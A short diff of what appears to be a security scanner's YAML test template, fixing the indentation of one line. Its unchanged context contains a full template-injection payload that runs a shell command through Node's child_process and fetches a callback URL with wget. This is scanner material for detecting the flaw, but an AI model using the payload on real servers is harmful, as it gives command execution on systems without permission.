@@ -32,7 +32,7 @@ execute:
   requests:
     - req:
       - send_ssrf_req:
-        url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
       - modify_url: "/page?settings[view%20options][closeDelimiter]=x%22)%3bprocess.mainModule.require(%27child_process%27).execSync(%27wget+https://test-services.akto.io/${random_uuid}%27)%3b//"
       - modify_method: GET
       - replace_body: '{}'
